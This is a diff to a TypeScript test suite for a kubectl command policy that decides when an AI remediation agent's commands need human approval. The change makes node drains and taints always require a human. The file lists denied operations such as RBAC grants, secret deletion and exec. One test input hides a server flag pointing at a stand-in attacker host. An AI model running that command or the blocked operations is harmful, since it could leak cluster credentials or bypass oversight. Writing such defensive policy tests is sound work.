@@ -30,9 +30,11 @@ import { describe, expect, it } from "@jest/globals";
  *     exec/cp/port-forward/apply/edit, credential and file flags,
  *     --all-namespaces writes, deleting namespaces/volumes/nodes/secrets/
  *     CRDs/RBAC in any spelling, resource categories in writes, RBAC and
- *     ServiceAccount grants (create/patch roles and bindings, set subject,
- *     set serviceaccount), pod-security patch fields, create job --image,
- *     a namespace set twice, and unknown verbs are Denied.
+ *     ServiceAccount grants (any write to roles and bindings, set subject,
+ *     set serviceaccount), any write to admission and API-extension kinds,
+ *     pod-security patch fields, patch bodies that are not JSON, create
+ *     deployment/cronjob and create job --image, a namespace set twice, and
+ *     unknown verbs are Denied.
  *  3. Flags are parsed exactly as kubectl's pflag parses them — short-flag
  *     clusters letter by letter, optional-value flags never consuming the
  *     next token, "_" read as "-", unknown flags refused — so a denied flag
@@ -47,7 +49,8 @@ import { describe, expect, it } from "@jest/globals";
  *     keeps RiskyWrite at RequiresApproval unless the cluster bypasses
  *     approvals or an allowlist pattern matches the argv token by token,
  *     never lifts a Denied, and never auto-approves a write in a protected
- *     namespace (not with bypass, not through the allowlist).
+ *     namespace, a node drain or a taint (not with bypass, not through the
+ *     allowlist).
  */
 
 function tier(command: string): KubectlCommandTier {
@@ -149,9 +152,15 @@ const LEGITIMATE_SHORT_FLAGS: Array<[string, KubectlCommandTier]> = [
     "kubectl set env deployment/web -n web -c app LOG_LEVEL=debug",
     KubectlCommandTier.RiskyWrite,
   ],
+  /*
+   * -r is --replicas on create deployment and parses as a value flag. The
+   * command used to be pinned RiskyWrite; it is Denied now for starting a
+   * workload from an image named in the command, not for its flags (the
+   * short-flag test below checks the reason).
+   */
   [
     "kubectl create deployment web --image=nginx -r 2 -n web",
-    KubectlCommandTier.RiskyWrite,
+    KubectlCommandTier.Denied,
   ],
 ];
 
@@ -1078,6 +1087,14 @@ describe("KubectlPolicy", () => {
       },
     );
 
+    it("reads -r as create deployment's --replicas, so the refusal is about the image", () => {
+      const text: string = reason(
+        "kubectl create deployment web --image=nginx -r 2 -n web",
+      );
+      expect(text).toContain("kubectl create deployment starts a new workload");
+      expect(text).not.toMatch(/flag.*not (allowed|a kubectl flag)/);
+    });
+
     it("names the denied letter and the cluster it hid in", () => {
       const result: KubectlPolicyResult = KubectlPolicy.evaluateCommand(
         "kubectl get pods -As http://attacker.example",
@@ -1741,11 +1758,9 @@ describe("KubectlPolicy", () => {
         expect(verdict.reason).toContain("bypasses approvals");
       });
 
-      it("auto-approves every RiskyWrite shape: patch, drain, taint, delete by selector, delete a deployment", () => {
+      it("auto-approves the RiskyWrite shapes: patch, delete by selector, delete a deployment, scale --all", () => {
         for (const command of [
           'kubectl patch deployment web -n web -p \'{"spec":{"replicas":2}}\'',
-          "kubectl drain node-1 --ignore-daemonsets",
-          "kubectl taint nodes node-1 key=value:NoSchedule",
           "kubectl delete pod -l app=web -n web",
           "kubectl delete deployment web -n web",
           "kubectl scale deployment --all --replicas=1 -n web",
@@ -1760,6 +1775,34 @@ describe("KubectlPolicy", () => {
           expect(verdict.verdict).toBe(
             AiRemediationCommandPolicyVerdict.AutoApproved,
           );
+          expect(verdict.requiresHuman).toBeUndefined();
+        }
+      });
+
+      /*
+       * drain and taint were in the list above: Bypass approval ran them
+       * unattended, although a drain evicts kube-system pods and the
+       * agent's own — the pods the every-mode protections promise a human
+       * for. They always need a human now.
+       */
+      it("never auto-approves a drain or a taint", () => {
+        for (const command of [
+          "kubectl drain node-1 --ignore-daemonsets",
+          "kubectl taint nodes node-1 key=value:NoSchedule",
+          "kubectl taint nodes node-1 key=value:NoExecute",
+        ]) {
+          const verdict: KubectlAutoExecutionVerdict =
+            KubectlPolicy.evaluateForAutoExecution({
+              command,
+              allowlistPatterns: [command],
+              bypassApproval: true,
+            });
+          expect(verdict.tier).toBe(KubectlCommandTier.RiskyWrite);
+          expect(verdict.verdict).toBe(
+            AiRemediationCommandPolicyVerdict.RequiresApproval,
+          );
+          expect(verdict.requiresHuman).toBe(true);
+          expect(verdict.reason).toContain("drain or taint");
         }
       });
 
